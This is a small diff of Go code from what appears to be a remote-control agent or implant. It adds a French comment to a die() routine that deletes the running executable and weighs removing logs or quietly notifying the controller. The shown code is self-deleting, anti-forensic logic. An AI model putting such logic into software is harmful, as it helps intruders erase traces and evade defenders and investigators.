@@ -164,6 +164,7 @@ func sendResult(agentId string, output string, taskId string) bool {
 func die() {
 	// Destruction call - Suppression éléments - Créer un trigger command
 	// Suppression logs ? Suppression des éléments?
+	// Ajouter call API bye ? Ou discretion?
 	var execPath string
 	execPath, _ = os.Executable()
 	os.Remove(execPath)
